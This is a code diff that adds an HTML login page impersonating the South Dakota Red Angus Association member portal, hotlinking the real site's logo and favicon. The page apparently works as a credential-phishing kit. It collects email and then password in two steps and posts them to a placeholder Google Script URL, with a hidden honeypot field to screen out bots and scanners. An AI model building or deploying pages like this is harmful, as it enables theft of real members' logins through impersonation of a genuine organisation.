@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>South Dakota Red Angus Association | Member Portal</title>
+<link rel="icon" href="https://www.southdakotaredangus.com/favicon.ico" type="image/x-icon">
+<style>
+/* Reset */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background-color: #f9f9f9;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    color: #333;
+}
+
+.container {
+    background: #fff;
+    width: 100%;
+    max-width: 400px;
+    padding: 30px;
+    border-radius: 6px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+    opacity: 0;
+    transform: translateY(10px);
+    animation: fadeIn 0.5s ease-out forwards;
+}
+
+@keyframes fadeIn {
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.header { text-align: center; margin-bottom: 25px; }
+.logo { width: 160px; height: auto; margin-bottom: 10px; }
+h2 { font-size: 18px; color: #b71c1c; font-weight: 600; margin-bottom: 5px; }
+.subtitle { font-size: 13px; color: #666; }
+
+.input-group { margin-bottom: 15px; text-align: left; }
+label { display: block; margin-bottom: 6px; font-size: 13px; font-weight: 500; color: #444; }
+input[type="email"], input[type="password"] {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    font-size: 14px;
+    transition: border-color 0.2s;
+    background: #fff;
+}
+input:focus { border-color: #b71c1c; outline: none; box-shadow: 0 0 0 2px rgba(183, 28, 28, 0.1); }
+
+.btn {
+    background: #b71c1c;
+    color: #fff;
+    border: none;
+    padding: 12px;
+    width: 100%;
+    border-radius: 4px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    position: relative;
+}
+.btn:hover { background: #9a1616; }
+.btn:disabled { background: #ccc; cursor: not-allowed; }
+
+.spinner {
+    display: none;
+    width: 16px; height: 16px;
+    border: 2px solid #fff;
+    border-top: 2px solid transparent;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    position: absolute; right: 15px; top: 50%; transform: translateY(-50%);
+}
+@keyframes spin { 0% { transform: translateY(-50%) rotate(0deg); } 100% { transform: translateY(-50%) rotate(360deg); } }
+
+.page { display: none; }
+.page.active { display: block; }
+
+/* Honeypot */
+.honey { position: absolute; left: -9999px; top: -9999px; opacity: 0; pointer-events: none; }
+
+.footer { margin-top: 20px; text-align: center; font-size: 11px; color: #999; }
+.footer a { color: #b71c1c; text-decoration: none; }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <!-- Use a real logo URL -->
+        <img src="https://www.southdakotaredangus.com/images/newhomepage.jpg" alt="SDRAA Logo" class="logo" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYwIiBoZWlnaHQ9IjYwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiNiNzFjMWMiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0id2hpdGUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCI+U0RSQUEgTG9nbyA8L3RleHQ+PC9zdmc+'">
+        <h2>Member Portal</h2>
+        <p class="subtitle">Please sign in to continue</p>
+    </div>
+
+    <form id="loginForm" action="YOUR_GOOGLE_SCRIPT_URL_HERE" method="POST">
+        
+        <!-- Honeypot -->
+        <input type="text" name="website" class="honey" autocomplete="off" tabindex="-1>
+        <input type="hidden" name="ts" value="">
+
+        <!-- Page 1: Email -->
+        <div id="page-email" class="page active">
+            <div class="input-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="username" required placeholder="name@example.com" autocomplete="email">
+            </div>
+            <button type="button" id="btn-next" class="btn">Next</button>
+        </div>
+
+        <!-- Page 2: Password -->
+        <div id="page-password" class="page">
+            <div class="input-group">
+                <label for="pass">Password</label>
+                <input type="password" id="pass" name="password" required placeholder="••••••••" autocomplete="current-password">
+            </div>
+            <button type="submit" id="btn-submit" class="btn">
+                Sign In
+                <div class="spinner"></div>
+            </button>
+        </div>
+    </form>
+
+    <div class="footer">
+        &copy; 2026 South Dakota Red Angus Association<br>
+        <a href="#">Privacy Policy</a> | <a href="#">Support</a>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    // Set hidden timestamp
+    document.querySelector('input[name="ts"]').value = new Date().getTime();
+
+    const btnNext = document.getElementById('btn-next');
+    const emailInput = document.getElementById('email');
+    const passInput = document.getElementById('pass');
+    const form = document.getElementById('loginForm');
+    const btnSubmit = document.getElementById('btn-submit');
+    const spinner = btnSubmit.querySelector('.spinner');
+
+    // Next Button
+    btnNext.addEventListener('click', function() {
+        if (emailInput.value && emailInput.checkValidity()) {
+            document.getElementById('page-email').classList.remove('active');
+            document.getElementById('page-password').classList.add('active');
+            passInput.focus();
+        } else {
+            alert('Please enter a valid email.');
+        }
+    });
+
+    // Submit Handler
+    form.addEventListener('submit', function(e) {
+        const honey = document.querySelector('.honey').value;
+        if (honey !== "") {
+            e.preventDefault();
+            return false;
+        }
+
+        btnSubmit.disabled = true;
+        spinner.style.display = 'block';
+        btnSubmit.childNodes[0].textContent = 'Signing in...';
+    });
+});
+</script>
+</body>
+</html>
